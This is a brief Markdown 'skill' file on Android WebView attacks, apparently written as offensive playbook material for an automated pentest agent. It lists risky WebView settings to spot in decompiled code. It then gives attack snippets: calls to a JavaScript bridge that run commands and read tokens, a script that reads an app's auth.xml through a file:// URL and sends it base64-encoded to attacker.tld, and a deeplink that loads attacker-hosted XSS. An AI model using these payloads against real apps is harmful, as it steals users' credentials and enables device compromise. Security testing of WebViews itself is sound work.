# SKILL: Android WebView Attacks
## Version: 1.0 | Domain: mobile

---

## IDENTITY
WebView with `setJavaScriptEnabled(true)` + `addJavascriptInterface` = any XSS in loaded page → native code execution.

## DETECTION
```java
// Look for in decompiled code:
webView.setJavaScriptEnabled(true);
webView.addJavascriptInterface(new Bridge(), "Android");
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
```

## EXPLOITATION
### XSS → native bridge
```javascript
// If addJavascriptInterface exposes "Android" object:
Android.executeCommand("id");
Android.getToken();
Android.readFile("/data/data/com.target.app/shared_prefs/auth.xml");
```

### File access
If `setAllowFileAccessFromFileURLs(true)`:
```javascript
var x = new XMLHttpRequest();
x.open("GET", "file:///data/data/com.target.app/shared_prefs/auth.xml");
x.onload = function() { fetch("https://attacker.tld/?d=" + btoa(x.responseText)); };
x.send();
```

### URL loading control
If deeplink loads arbitrary URL in WebView:
```
target://webview?url=https://attacker.tld/xss.html
```
Then xss.html uses `Android.*` bridge methods.

## CHAIN POTENTIAL
XSS in WebView → native RCE via bridge → full device compromise.

## REFERENCES
OWASP MASTG — WebView Testing
